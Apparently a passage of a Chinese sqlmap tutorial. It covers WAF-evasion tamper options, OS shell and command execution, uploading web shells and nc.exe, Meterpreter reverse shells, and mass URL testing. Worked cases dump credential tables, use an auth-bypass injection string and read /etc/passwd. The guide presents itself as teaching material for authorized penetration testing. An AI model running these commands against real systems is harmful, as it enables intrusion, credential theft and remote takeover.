| `sp_password` | 添加 sp_password 隐藏日志 | MSSQL |
| `unionalltounion` | `UNION ALL` 替换为 `UNION` | 通用 |
| `unmagicquotes` | 绕过 magic_quotes | 通用 |
| `versionedkeywords` | 版本注释包裹关键字 | MySQL |
| `versionedmorekeywords` | 更多版本注释 | MySQL |

### 11.3 Tamper 脚本组合推荐

```bash
# 绕过基础 WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,between"

# 绕过 ModSecurity
sqlmap -u "http://target.com/page.php?id=1" --tamper="modsecurityversioned,space2comment"

# 绕过云 WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper="charencode,space2comment,between,randomcase"

# 绕过严格过滤
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2randomblank,between,randomcase,charencode"

# MySQL 专用绕过
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,versionedkeywords,ifnull2ifisnull"

# SQL Server 专用绕过
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,sp_password,charencode"
```

### 11.4 自定义 Tamper 脚本

```python
#!/usr/bin/env python
# 自定义 Tamper 脚本示例
# 保存到 /usr/share/sqlmap/tamper/custom_tamper.py

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    将空格替换为 Tab 字符
    """
    if payload:
        payload = payload.replace(" ", "\t")
    return payload
```

```bash
# 使用自定义 Tamper 脚本
sqlmap -u "http://target.com/page.php?id=1" --tamper=custom_tamper
```

### 11.5 其他绕过技术

```bash
# 使用随机 User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# 添加延迟避免被封
sqlmap -u "http://target.com/page.php?id=1" --delay=2

# 随机化参数值
sqlmap -u "http://target.com/page.php?id=1" --randomize=id

# 使用 HPP（HTTP 参数污染）
sqlmap -u "http://target.com/page.php?id=1" --hpp

# 使用分块传输编码
sqlmap -u "http://target.com/page.php?id=1" --chunked

# 使用 HTTP 参数污染
sqlmap -u "http://target.com/page.php?id=1" --hpp

# 跳过 URL 编码
sqlmap -u "http://target.com/page.php?id=1" --skip-urlencode

# 使用空字节
sqlmap -u "http://target.com/page.php?id=1" --null-connection
```

### 11.6 绕过 WAF 检测

```bash
# 识别 WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# 跳过 WAF 检测
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# 综合绕过策略
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper="space2comment,between,randomcase" \
    --random-agent \
    --delay=2 \
    --time-sec=10 \
    --level=3 \
    --risk=2
```

---

## 12. 操作系统交互

### 12.1 获取 Shell

```bash
# 获取操作系统 Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 选择 Web 应用语言
# [1] ASP
# [2] ASPX
# [3] JSP
# [4] PHP (default)

# 选择上传目录
# [1] common location(s) ('/var/www/, /var/www/html')
# [2] custom location(s)
# [3] custom directory list file
# [4] brute force search
```

### 12.2 执行命令

```bash
# 执行单条命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id"

# 执行多条命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id && whoami && uname -a"

# Windows 命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="ipconfig"
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="net user"
```

### 12.3 上传文件

```bash
# 上传文件到服务器
sqlmap -u "http://target.com/page.php?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"

# 上传二进制文件
sqlmap -u "http://target.com/page.php?id=1" --file-write="./nc.exe" --file-dest="C:/Windows/Temp/nc.exe"
```

### 12.4 Meterpreter 集成

```bash
# 获取 Meterpreter Shell
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# 指定 Metasploit 路径
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit-framework

# 选择 Payload 类型
# [1] TCP: Meterpreter - Reverse TCP
# [2] TCP: Shell - Reverse TCP
# [3] HTTP: Meterpreter - Reverse HTTP
# [4] HTTPS: Meterpreter - Reverse HTTPS
```

### 12.5 VNC 连接（Windows）

```bash
# 启动 VNC 服务
sqlmap -u "http://target.com/page.php?id=1" --os-bof --priv-esc
```

---

## 13. 自动化与批量测试

### 13.1 批量 URL 测试

```bash
# 从文件读取 URL 列表
sqlmap -m urls.txt --batch

# urls.txt 内容：
# http://target1.com/page.php?id=1
# http://target2.com/news.php?id=2
# http://target3.com/article.php?id=3

# 批量测试并导出数据
sqlmap -m urls.txt --batch --dbs --dump-all --exclude-sysdbs
```

### 13.2 使用配置文件

```bash
# 创建配置文件
cat > sqlmap.conf << 'EOF'
[Target]
url = http://target.com/page.php?id=1

[Request]
cookie = PHPSESSID=abc123
agent = Mozilla/5.0 (Windows NT 10.0; Win64; x64)
timeout = 30
retries = 3
delay = 1

[Detection]
level = 3
risk = 2
technique = BEUST

[Enumeration]
dbs = True
tables = True
columns = True
dump = True
exclude-sysdbs = True

[Optimization]
threads = 5
predict-output = True
keep-alive = True
EOF

# 使用配置文件
sqlmap -c sqlmap.conf
```

### 13.3 API 模式

SQLMap 提供了 REST API 模式，可以通过 HTTP 接口调用。

```bash
# 启动 API 服务
sqlmapapi -s

# 或指定端口
sqlmapapi -s -p 8775

# API 端点：
# POST /task/new          - 创建新任务
# GET  /task/<taskid>/delete - 删除任务
# POST /scan/<taskid>/start  - 开始扫描
# GET  /scan/<taskid>/status - 获取状态
# GET  /scan/<taskid>/data   - 获取数据
# GET  /scan/<taskid>/log    - 获取日志
```

```python
# Python 调用 SQLMap API 示例
import requests
import time

API_URL = "http://127.0.0.1:8775"

# 创建任务
task = requests.get(f"{API_URL}/task/new").json()
task_id = task['taskid']
print(f"Task ID: {task_id}")

# 设置选项
options = {
    "url": "http://target.com/page.php?id=1",
    "batch": True,
    "dbs": True
}
requests.post(f"{API_URL}/option/{task_id}/set", json=options)

# 开始扫描
requests.post(f"{API_URL}/scan/{task_id}/start")

# 等待完成
while True:
    status = requests.get(f"{API_URL}/scan/{task_id}/status").json()
    if status['status'] == 'terminated':
        break
    time.sleep(2)

# 获取结果
data = requests.get(f"{API_URL}/scan/{task_id}/data").json()
print(data)

# 删除任务
requests.get(f"{API_URL}/task/{task_id}/delete")
```

### 13.4 与 Burp Suite 集成

```bash
# 1. 在 Burp Suite 中捕获请求
# 2. 右键 -> Copy to file -> 保存为 request.txt
# 3. 使用 SQLMap 测试

sqlmap -r request.txt --batch

# 或者使用 Burp Suite 的 SQLMap 插件
# 安装 CO2 或 SQLiPy 插件
```

### 13.5 自动化脚本示例

```bash
#!/bin/bash
# SQLMap 自动化测试脚本

TARGET_FILE="urls.txt"
OUTPUT_DIR="./sqlmap_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$OUTPUT_DIR"

while IFS= read -r url; do
    echo "[*] Testing: $url"
    
    # 提取域名作为文件名
    domain=$(echo "$url" | awk -F/ '{print $3}')
    
    # 运行 SQLMap
    sqlmap -u "$url" \
        --batch \
        --level=3 \
        --risk=2 \
        --dbs \
        --random-agent \
        --output-dir="$OUTPUT_DIR/${domain}_${TIMESTAMP}" \
        2>&1 | tee "$OUTPUT_DIR/${domain}_${TIMESTAMP}.log"
    
    echo "[+] Completed: $url"
    echo "---"
    
done < "$TARGET_FILE"

echo "[*] All tests completed!"
```

---

## 14. 实战案例

### 14.1 案例一：基础 GET 注入

**场景**：测试一个简单的新闻页面，URL 为 `http://target.com/news.php?id=1`

```bash
# 步骤 1：基础测试
sqlmap -u "http://target.com/news.php?id=1"

# 输出示例：
# [INFO] testing connection to the target URL
# [INFO] testing if the target URL content is stable
# [INFO] target URL content is stable
# [INFO] testing if GET parameter 'id' is dynamic
# [INFO] GET parameter 'id' appears to be dynamic
# [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
# [INFO] testing for SQL injection on GET parameter 'id'
# ...
# [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
# [INFO] GET parameter 'id' is 'MySQL >= 5.0 OR error-based' injectable
# [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND time-based blind' injectable
# [INFO] GET parameter 'id' is 'MySQL UNION query (NULL)' injectable

# 步骤 2：获取数据库列表
sqlmap -u "http://target.com/news.php?id=1" --dbs --batch

# 输出：
# [*] information_schema
# [*] mysql
# [*] news_db

# 步骤 3：获取表列表
sqlmap -u "http://target.com/news.php?id=1" -D news_db --tables --batch

# 输出：
# [*] articles
# [*] users
# [*] comments

# 步骤 4：获取列信息
sqlmap -u "http://target.com/news.php?id=1" -D news_db -T users --columns --batch

# 输出：
# | id       | int(11)      |
# | username | varchar(50)  |
# | password | varchar(255) |
# | email    | varchar(100) |

# 步骤 5：导出数据
sqlmap -u "http://target.com/news.php?id=1" -D news_db -T users -C username,password --dump --batch

# 输出：
# | username | password                         |
# | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
# | user1    | e10adc3949ba59abbe56e057f20f883e |
```

### 14.2 案例二：POST 登录表单注入

**场景**：测试一个登录表单

```bash
# 步骤 1：使用 Burp Suite 捕获登录请求，保存为 login.txt
# login.txt 内容：
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=test

# 步骤 2：测试注入
sqlmap -r login.txt --batch

# 步骤 3：如果 username 参数存在注入
sqlmap -r login.txt -p username --dbs --batch

# 步骤 4：绕过登录（如果存在注入）
# 手动测试：username=admin' OR '1'='1'-- -&password=anything
```

### 14.3 案例三：Cookie 注入

**场景**：Cookie 中的参数存在注入

```bash
# 步骤 1：测试 Cookie 注入（需要 level >= 2）
sqlmap -u "http://target.com/profile.php" --cookie="user_id=1" --level=2 --batch

# 步骤 2：如果发现注入
sqlmap -u "http://target.com/profile.php" --cookie="user_id=1*" --level=2 --dbs --batch

# 步骤 3：导出数据
sqlmap -u "http://target.com/profile.php" --cookie="user_id=1*" --level=2 -D target_db -T users --dump --batch
```

### 14.4 案例四：JSON 数据注入

**场景**：API 接口使用 JSON 格式

```bash
# 步骤 1：保存请求到文件
# api_request.txt 内容：
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/json

{"query":"test","page":1}

# 步骤 2：测试注入
sqlmap -r api_request.txt --batch

# 步骤 3：标记注入点
# 修改 api_request.txt：
{"query":"test*","page":1}

sqlmap -r api_request.txt --batch --dbs
```

### 14.5 案例五：绕过 WAF

**场景**：目标网站有 WAF 保护

```bash
# 步骤 1：识别 WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# 输出：
# [INFO] checking if the target is protected by some kind of WAF/IPS
# [INFO] heuristics detected web page changes
# [WARNING] WAF/IPS identified as 'ModSecurity'

# 步骤 2：使用 Tamper 脚本绕过
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper="space2comment,between,randomcase" \
    --random-agent \
    --delay=2 \
    --batch

# 步骤 3：如果还是被拦截，尝试更多绕过技术
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper="space2comment,between,randomcase,charencode" \
    --random-agent \
    --delay=3 \
    --time-sec=10 \
    --level=3 \
    --risk=2 \
    --technique=BT \
    --batch
```

### 14.6 案例六：获取 Shell

**场景**：需要获取服务器 Shell

```bash
# 步骤 1：确认注入并检查权限
sqlmap -u "http://target.com/page.php?id=1" --is-dba --batch

# 输出：
# [INFO] current user is DBA: True

# 步骤 2：尝试获取 OS Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 选择 Web 应用语言和上传目录
# [1] ASP
# [2] ASPX
# [3] JSP
# [4] PHP (default)
# > 4

# [1] common location(s) ('/var/www/, /var/www/html')
# [2] custom location(s)
# > 1

# 步骤 3：在 Shell 中执行命令
os-shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

os-shell> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...

os-shell> uname -a
Linux target 4.15.0-112-generic #113-Ubuntu SMP x86_64 GNU/Linux
```

### 14.7 案例七：二阶注入

**场景**：注入点和触发点不在同一个请求

```bash
# 二阶注入说明：
# 1. 用户在注册页面输入恶意数据
# 2. 数据被存储到数据库
# 3. 在另一个页面（如个人资料页）触发注入

# 步骤 1：使用 --second-url 参数
sqlmap -u "http://target.com/register.php" \
    --data="username=test'&password=123&email=test@test.com" \
    --second-url="http://target.com/profile.php" \
    --batch

# 步骤 2：或者使用 --second-req 参数
sqlmap -u "http://target.com/register.php" \
    --data="username=test'&password=123" \
    --second-req=profile_request.txt \
    --batch
```

---

## 15. 常见错误与解决方案

### 15.1 连接错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `connection timed out` | 网络超时 | 增加 `--timeout` 值 |
| `connection refused` | 目标拒绝连接 | 检查目标是否在线 |
| `unable to connect` | 无法连接 | 检查网络和防火墙 |
| `HTTP error code: 403` | 被禁止访问 | 使用代理或更换 IP |
| `HTTP error code: 503` | 服务不可用 | 增加延迟 `--delay` |

```bash
# 解决超时问题
sqlmap -u "http://target.com/page.php?id=1" --timeout=60 --retries=5

# 解决被封问题
sqlmap -u "http://target.com/page.php?id=1" --delay=3 --random-agent --proxy="http://127.0.0.1:8080"
```

### 15.2 检测错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `parameter does not seem to be injectable` | 参数不可注入或检测不到 | 提高 level 和 risk |
| `all tested parameters do not appear to be injectable` | 所有参数都不可注入 | 检查是否有其他注入点 |
| `target URL content is not stable` | 页面内容不稳定 | 使用 `--string` 或 `--not-string` |
| `heuristic test shows that parameter might not be injectable` | 启发式测试失败 | 尝试手动测试 |

```bash
# 提高检测级别
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3

# 指定页面稳定性标识
sqlmap -u "http://target.com/page.php?id=1" --string="Welcome" --not-string="Error"

# 强制测试
sqlmap -u "http://target.com/page.php?id=1" --force-ssl --skip-waf
```

### 15.3 数据库错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `unable to retrieve the number of databases` | 无法获取数据库数量 | 尝试不同的注入技术 |
| `unable to retrieve the tables` | 无法获取表 | 检查权限 |
| `unable to retrieve the columns` | 无法获取列 | 检查权限 |
| `unable to dump the table` | 无法导出数据 | 检查权限或使用 `--where` |

```bash
# 尝试不同的注入技术
sqlmap -u "http://target.com/page.php?id=1" --technique=E --dbs

# 使用条件导出
sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump --where="id<100"
```

### 15.4 WAF/IPS 错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `WAF/IPS detected` | 检测到 WAF | 使用 Tamper 脚本 |
| `possible WAF/IPS protection` | 可能有 WAF | 使用绕过技术 |
| `target seems to be protected` | 目标受保护 | 组合多种绕过技术 |

```bash
# 绕过 WAF
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper="space2comment,between,randomcase" \
    --random-agent \
    --delay=2 \
    --skip-waf
```

### 15.5 编码错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `unable to decode response` | 响应解码失败 | 指定编码 |
| `invalid character` | 无效字符 | 使用 `--hex` |
| `encoding error` | 编码错误 | 使用 `--charset` |

```bash
# 指定字符集
sqlmap -u "http://target.com/page.php?id=1" --charset=utf-8

# 使用十六进制
sqlmap -u "http://target.com/page.php?id=1" --hex
```

### 15.6 会话错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `session expired` | 会话过期 | 更新 Cookie |
| `CSRF token mismatch` | CSRF 令牌不匹配 | 使用 `--csrf-token` |
| `login required` | 需要登录 | 提供有效的 Cookie |

```bash
# 处理 CSRF 令牌
sqlmap -u "http://target.com/page.php?id=1" --csrf-token="csrf_token"

# 使用安全 URL 保持会话
sqlmap -u "http://target.com/page.php?id=1" \
    --safe-url="http://target.com/index.php" \
    --safe-freq=10
```

### 15.7 常见问题 FAQ

**Q1: SQLMap 运行很慢怎么办？**

```bash
# 优化速度
sqlmap -u "http://target.com/page.php?id=1" \
    --threads=10 \
    --technique=EU \
    --dbms=mysql \
    --batch
```

**Q2: 如何测试需要登录的页面？**

```bash
# 方法 1：使用 Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# 方法 2：从文件读取请求
sqlmap -r request.txt
```

**Q3: 如何测试 HTTPS 网站？**

```bash
# 忽略证书错误
sqlmap -u "https://target.com/page.php?id=1" --force-ssl
```

**Q4: 如何恢复之前的扫描？**

```bash
# SQLMap 会自动保存会话，直接运行相同命令即可恢复
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 或者清除会话重新开始
sqlmap -u "http://target.com/page.php?id=1" --flush-session
```

**Q5: 如何只测试特定参数？**

```bash
# 使用 -p 参数
sqlmap -u "http://target.com/page.php?id=1&name=test&page=2" -p id

# 或使用星号标记
sqlmap -u "http://target.com/page.php?id=1*&name=test&page=2"
```

---

## 16. 最佳实践与技巧

### 16.1 测试前准备

```bash
# 1. 确认授权
# 确保你有合法的测试授权！

# 2. 了解目标
# - 目标 URL 和参数
# - 使用的技术栈
# - 是否有 WAF

# 3. 准备环境
# - 更新 SQLMap
git pull

# - 准备代理（可选）
# - 准备字典文件
```

### 16.2 推荐的测试流程

```bash
# 步骤 1：基础检测
sqlmap -u "http://target.com/page.php?id=1" --batch

# 步骤 2：如果检测到注入，获取基本信息
sqlmap -u "http://target.com/page.php?id=1" -b --current-user --current-db --is-dba --batch

# 步骤 3：枚举数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# 步骤 4：枚举表
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables --batch

# 步骤 5：枚举列
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns --batch

# 步骤 6：导出敏感数据
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users -C username,password --dump --batch
```

### 16.3 性能优化

```bash
# 多线程
sqlmap -u "http://target.com/page.php?id=1" --threads=10

# 预测输出（加速盲注）
sqlmap -u "http://target.com/page.php?id=1" --predict-output

# 保持连接
sqlmap -u "http://target.com/page.php?id=1" --keep-alive

# 空连接（检测布尔盲注）
sqlmap -u "http://target.com/page.php?id=1" --null-connection

# 指定数据库类型
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# 排除不需要的技术
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU
```

### 16.4 安全建议

```
┌─────────────────────────────────────────────────────────────────┐
│                    安全测试注意事项                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ✓ 始终获得书面授权                                            │
│   ✓ 在测试环境中先练习                                          │
│   ✓ 使用 --batch 避免意外操作                                   │
│   ✓ 避免使用 risk=3（可能修改数据）                             │
│   ✓ 记录所有测试活动                                            │
│   ✓ 测试完成后清理痕迹                                          │
│                                                                 │
│   ✗ 不要在未授权的系统上测试                                    │
│   ✗ 不要使用 --os-shell 除非必要                                │
│   ✗ 不要导出敏感数据到不安全的位置                              │
│   ✗ 不要在生产环境使用高风险选项                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 16.5 常用命令速查

```bash
# 基础测试
sqlmap -u "URL" --batch

# 完整测试
sqlmap -u "URL" --level=5 --risk=3 --batch

# 获取所有数据库
sqlmap -u "URL" --dbs --batch

# 获取表
sqlmap -u "URL" -D database --tables --batch

# 获取列
sqlmap -u "URL" -D database -T table --columns --batch

# 导出数据
sqlmap -u "URL" -D database -T table --dump --batch

# 获取 Shell
sqlmap -u "URL" --os-shell

# 读取文件
sqlmap -u "URL" --file-read="/etc/passwd"

# 绕过 WAF
sqlmap -u "URL" --tamper="space2comment,between" --random-agent

# 使用代理
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# 从文件读取请求
sqlmap -r request.txt --batch
```

---

## 附录：参数速查表

### 目标参数

| 参数 | 说明 |
|------|------|
| `-u URL` | 目标 URL |
| `-r FILE` | 从文件读取请求 |
| `-m FILE` | 批量 URL 文件 |
| `-g DORK` | Google Dork |
| `-l FILE` | Burp/WebScarab 日志 |

### 请求参数

| 参数 | 说明 |
|------|------|
| `--data=DATA` | POST 数据 |
| `--cookie=COOKIE` | Cookie |
| `--user-agent=UA` | User-Agent |
| `--headers=HEADERS` | 自定义头 |
| `--proxy=PROXY` | 代理 |
| `--delay=DELAY` | 延迟（秒） |
| `--timeout=TIMEOUT` | 超时（秒） |

### 检测参数

| 参数 | 说明 |
|------|------|
| `--level=LEVEL` | 检测级别 (1-5) |
| `--risk=RISK` | 风险级别 (1-3) |
| `--technique=TECH` | 注入技术 |
| `--dbms=DBMS` | 数据库类型 |
| `-p PARAM` | 测试参数 |

### 枚举参数

| 参数 | 说明 |
|------|------|
| `--dbs` | 枚举数据库 |
| `--tables` | 枚举表 |
| `--columns` | 枚举列 |
| `--dump` | 导出数据 |
| `--dump-all` | 导出所有 |
| `-D DB` | 指定数据库 |
| `-T TABLE` | 指定表 |
| `-C COLUMNS` | 指定列 |

### 高级参数

| 参数 | 说明 |
|------|------|
| `--os-shell` | 获取 Shell |
| `--os-cmd=CMD` | 执行命令 |
| `--file-read=FILE` | 读取文件 |
| `--file-write=FILE` | 写入文件 |
| `--tamper=TAMPER` | Tamper 脚本 |
| `--batch` | 自动回答 |
| `--threads=N` | 线程数 |

---

> 本笔记持续更新中，最后更新：2025年12月
> 
> 免责声明：本笔记仅供安全研究和授权渗透测试学习使用。
> 未经授权对他人系统进行 SQL 注入测试是违法行为。
> 请遵守当地法律法规，合法合规地使用 SQLMap。
